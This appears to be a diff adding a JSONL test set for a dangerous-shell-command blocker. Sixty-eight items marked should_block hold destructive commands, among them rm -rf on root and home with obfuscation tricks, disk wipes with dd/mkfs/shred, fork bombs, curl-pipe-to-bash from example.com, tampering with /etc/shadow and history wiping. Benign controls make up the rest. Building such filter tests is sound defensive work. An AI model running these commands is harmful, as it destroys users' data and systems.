@@ -1,0 +1,109 @@
+{"id": "v2-0001", "command": "rm --recursive --force /", "technique": "rm_long_options", "should_block": true}
+{"id": "v2-0002", "command": "rm -r -f /", "technique": "rm_split_flags", "should_block": true}
+{"id": "v2-0003", "command": "rm -fr /", "technique": "rm_flags_reordered", "should_block": true}
+{"id": "v2-0004", "command": "rm -Rf /", "technique": "rm_capital_r", "should_block": true}
+{"id": "v2-0005", "command": "rm / -rf", "technique": "rm_flags_after_target", "should_block": true}
+{"id": "v2-0006", "command": "rm -rf --no-preserve-root /", "technique": "rm_no_preserve_root", "should_block": true}
+{"id": "v2-0007", "command": "rm -rf /.", "technique": "rm_target_dot", "should_block": true}
+{"id": "v2-0008", "command": "rm -rf //", "technique": "rm_target_double_slash", "should_block": true}
+{"id": "v2-0009", "command": "rm -rf /tmp/..", "technique": "rm_target_parent_walk", "should_block": true}
+{"id": "v2-0010", "command": "rm -rf /*", "technique": "rm_target_glob", "should_block": true}
+{"id": "v2-0011", "command": "rm -rf $HOME", "technique": "rm_target_home_var", "should_block": true}
+{"id": "v2-0012", "command": "rm -rf ${HOME}", "technique": "rm_target_home_braced", "should_block": true}
+{"id": "v2-0013", "command": "rm -rf \"$HOME\"", "technique": "rm_target_home_quoted", "should_block": true}
+{"id": "v2-0014", "command": "rm -rf ~/*", "technique": "rm_target_tilde_glob", "should_block": true}
+{"id": "v2-0015", "command": "rm -rf /etc", "technique": "rm_target_system_dir", "should_block": true}
+{"id": "v2-0016", "command": "rm -rf /usr", "technique": "rm_target_system_dir", "should_block": true}
+{"id": "v2-0017", "command": "rm -rf /var/lib", "technique": "rm_target_system_dir", "should_block": true}
+{"id": "v2-0018", "command": "rm -rf $(echo /)", "technique": "rm_target_substitution", "should_block": true}
+{"id": "v2-0019", "command": "rm -rf $(pwd)/..", "technique": "rm_target_pwd_parent", "should_block": true}
+{"id": "v2-0020", "command": "T=/; rm -rf $T", "technique": "target_in_variable", "should_block": true}
+{"id": "v2-0021", "command": "T=/; rm -rf \"$T\"", "technique": "target_in_variable", "should_block": true}
+{"id": "v2-0022", "command": "d=/dev/sda; dd if=/dev/zero of=$d", "technique": "target_in_variable", "should_block": true}
+{"id": "v2-0023", "command": "d=/dev/sda; mkfs.ext4 $d", "technique": "target_in_variable", "should_block": true}
+{"id": "v2-0024", "command": "r\"\"m -rf $HOME", "technique": "combined_obfuscation", "should_block": true}
+{"id": "v2-0025", "command": "r''m -r -f /", "technique": "combined_obfuscation", "should_block": true}
+{"id": "v2-0026", "command": "\\rm --recursive --force /", "technique": "combined_obfuscation", "should_block": true}
+{"id": "v2-0027", "command": "bash -c \"rm -rf $HOME\"", "technique": "combined_obfuscation", "should_block": true}
+{"id": "v2-0028", "command": "eval 'rm -rf ${HOME}'", "technique": "combined_obfuscation", "should_block": true}
+{"id": "v2-0029", "command": "dd if=/dev/zero of=/dev/nvme0n1", "technique": "disk_alt_device", "should_block": true}
+{"id": "v2-0030", "command": "dd if=/dev/urandom of=/dev/sdb bs=1M", "technique": "disk_alt_device", "should_block": true}
+{"id": "v2-0031", "command": "dd of=/dev/sda if=/dev/zero", "technique": "disk_alt_device", "should_block": true}
+{"id": "v2-0032", "command": "mkfs -t ext4 /dev/sda1", "technique": "disk_alt_device", "should_block": true}
+{"id": "v2-0033", "command": "mkfs.xfs -f /dev/sdb", "technique": "disk_alt_device", "should_block": true}
+{"id": "v2-0034", "command": "wipefs -a /dev/sda", "technique": "disk_alt_device", "should_block": true}
+{"id": "v2-0035", "command": "shred -vfz -n 3 /dev/sda", "technique": "disk_alt_device", "should_block": true}
+{"id": "v2-0036", "command": "cat /dev/urandom > /dev/sda", "technique": "disk_alt_device", "should_block": true}
+{"id": "v2-0037", "command": "echo x | tee /dev/sda", "technique": "disk_alt_device", "should_block": true}
+{"id": "v2-0038", "command": "chmod -R 000 /etc", "technique": "perm_system_path", "should_block": true}
+{"id": "v2-0039", "command": "chmod -R 777 /usr", "technique": "perm_system_path", "should_block": true}
+{"id": "v2-0040", "command": "chown -R nobody /", "technique": "perm_system_path", "should_block": true}
+{"id": "v2-0041", "command": "chown -R nobody:nobody /etc", "technique": "perm_system_path", "should_block": true}
+{"id": "v2-0042", "command": "find / -type f -delete", "technique": "find_destructive", "should_block": true}
+{"id": "v2-0043", "command": "find ~ -delete", "technique": "find_destructive", "should_block": true}
+{"id": "v2-0044", "command": "find / -name '*' -exec rm -f {} \\;", "technique": "find_destructive", "should_block": true}
+{"id": "v2-0045", "command": "ls / | xargs rm -rf", "technique": "xargs_separated", "should_block": true}
+{"id": "v2-0046", "command": "echo /dev/sda | xargs shred", "technique": "xargs_separated", "should_block": true}
+{"id": "v2-0047", "command": "printf '%s\\n' / | xargs -I{} rm -rf {}", "technique": "xargs_separated", "should_block": true}
+{"id": "v2-0048", "command": "curl -fsSL http://example.com/i.sh | bash", "technique": "remote_code", "should_block": true}
+{"id": "v2-0049", "command": "wget -O- http://example.com/i.sh | sudo sh", "technique": "remote_code", "should_block": true}
+{"id": "v2-0050", "command": "bash <(curl -s http://example.com/i.sh)", "technique": "remote_code", "should_block": true}
+{"id": "v2-0051", "command": "python3 -c 'import os; os.system(\"rm -rf /\")'", "technique": "interpreter_delete", "should_block": true}
+{"id": "v2-0052", "command": "perl -e 'system(\"rm -rf $ENV{HOME}\")'", "technique": "interpreter_delete", "should_block": true}
+{"id": "v2-0053", "command": "ruby -e 'system(\"rm -rf /\")'", "technique": "interpreter_delete", "should_block": true}
+{"id": "v2-0054", "command": "echo > /etc/passwd", "technique": "critical_file", "should_block": true}
+{"id": "v2-0055", "command": "truncate -s 0 /etc/shadow", "technique": "critical_file", "should_block": true}
+{"id": "v2-0056", "command": "mv /etc/passwd /tmp/p", "technique": "critical_file", "should_block": true}
+{"id": "v2-0057", "command": "cat /dev/null > /boot/vmlinuz", "technique": "critical_file", "should_block": true}
+{"id": "v2-0058", "command": "history -c; rm -f ~/.bash_history", "technique": "history_wipe", "should_block": true}
+{"id": "v2-0059", "command": "shred -u ~/.bash_history", "technique": "history_wipe", "should_block": true}
+{"id": "v2-0060", "command": ":(){ :|:& };:", "technique": "fork_bomb", "should_block": true}
+{"id": "v2-0061", "command": "bomb() { bomb | bomb & }; bomb", "technique": "fork_bomb", "should_block": true}
+{"id": "v2-0062", "command": "kill -9 -1", "technique": "process_kill", "should_block": true}
+{"id": "v2-0063", "command": "killall -9 sshd", "technique": "process_kill", "should_block": true}
+{"id": "v2-0064", "command": "pkill -9 -u root", "technique": "process_kill", "should_block": true}
+{"id": "v2-0065", "command": "reboot", "technique": "power", "should_block": true}
+{"id": "v2-0066", "command": "poweroff -f", "technique": "power", "should_block": true}
+{"id": "v2-0067", "command": "systemctl poweroff", "technique": "power", "should_block": true}
+{"id": "v2-0068", "command": "init 0", "technique": "power", "should_block": true}
+{"id": "v2-0069", "command": "rm -rf ./build", "technique": "benign", "should_block": false}
+{"id": "v2-0070", "command": "rm -rf node_modules", "technique": "benign", "should_block": false}
+{"id": "v2-0071", "command": "rm -rf /tmp/mydir", "technique": "benign", "should_block": false}
+{"id": "v2-0072", "command": "rm -f *.log", "technique": "benign", "should_block": false}
+{"id": "v2-0073", "command": "rm -r build/", "technique": "benign", "should_block": false}
+{"id": "v2-0074", "command": "rm -rf \"$HOME/.cache/pip\"", "technique": "benign", "should_block": false}
+{"id": "v2-0075", "command": "dd if=/dev/zero of=./test.img bs=1M count=10", "technique": "benign", "should_block": false}
+{"id": "v2-0076", "command": "dd if=input.iso of=output.iso", "technique": "benign", "should_block": false}
+{"id": "v2-0077", "command": "mkfs.ext4 ./disk.img", "technique": "benign", "should_block": false}
+{"id": "v2-0078", "command": "truncate -s 10M sparse.img", "technique": "benign", "should_block": false}
+{"id": "v2-0079", "command": "chmod -R 755 ./site", "technique": "benign", "should_block": false}
+{"id": "v2-0080", "command": "chmod 600 ~/.ssh/id_rsa", "technique": "benign", "should_block": false}
+{"id": "v2-0081", "command": "chown -R $USER ./project", "technique": "benign", "should_block": false}
+{"id": "v2-0082", "command": "find . -name '*.o' -delete", "technique": "benign", "should_block": false}
+{"id": "v2-0083", "command": "find /var/log -name '*.gz' -type f", "technique": "benign", "should_block": false}
+{"id": "v2-0084", "command": "find . -type f -name '*.bak'", "technique": "benign", "should_block": false}
+{"id": "v2-0085", "command": "ls | xargs wc -l", "technique": "benign", "should_block": false}
+{"id": "v2-0086", "command": "echo a b | xargs echo", "technique": "benign", "should_block": false}
+{"id": "v2-0087", "command": "kill -9 4321", "technique": "benign", "should_block": false}
+{"id": "v2-0088", "command": "kill -TERM 999", "technique": "benign", "should_block": false}
+{"id": "v2-0089", "command": "pkill -f myscript", "technique": "benign", "should_block": false}
+{"id": "v2-0090", "command": "systemctl status ssh", "technique": "benign", "should_block": false}
+{"id": "v2-0091", "command": "history | tail -n 5", "technique": "benign", "should_block": false}
+{"id": "v2-0092", "command": "cat ~/.bash_history | grep ssh", "technique": "benign", "should_block": false}
+{"id": "v2-0093", "command": "cat /etc/os-release", "technique": "benign", "should_block": false}
+{"id": "v2-0094", "command": "ls -l /etc/passwd", "technique": "benign", "should_block": false}
+{"id": "v2-0095", "command": "stat /etc/shadow", "technique": "benign", "should_block": false}
+{"id": "v2-0096", "command": "ls /boot", "technique": "benign", "should_block": false}
+{"id": "v2-0097", "command": "df -h /dev/sda1", "technique": "benign", "should_block": false}
+{"id": "v2-0098", "command": "lsblk", "technique": "benign", "should_block": false}
+{"id": "v2-0099", "command": "fdisk -l", "technique": "benign", "should_block": false}
+{"id": "v2-0100", "command": "curl -fsSL http://example.com/i.sh -o i.sh", "technique": "benign", "should_block": false}
+{"id": "v2-0101", "command": "wget http://example.com/file.tar.gz", "technique": "benign", "should_block": false}
+{"id": "v2-0102", "command": "python3 -c 'print(1 + 1)'", "technique": "benign", "should_block": false}
+{"id": "v2-0103", "command": "perl -e 'print \"hi\\n\"'", "technique": "benign", "should_block": false}
+{"id": "v2-0104", "command": "echo \"reboot\"", "technique": "benign", "should_block": false}
+{"id": "v2-0105", "command": "echo 'rm -rf /' | cat", "technique": "benign", "should_block": false}
+{"id": "v2-0106", "command": "grep -rn \"mkfs\" docs/", "technique": "benign", "should_block": false}
+{"id": "v2-0107", "command": "man shutdown", "technique": "benign", "should_block": false}
+{"id": "v2-0108", "command": "cp /etc/hostname ./hostname.bak", "technique": "benign", "should_block": false}
+{"id": "v2-0109", "command": "tar -tzf backup.tar.gz", "technique": "benign", "should_block": false}
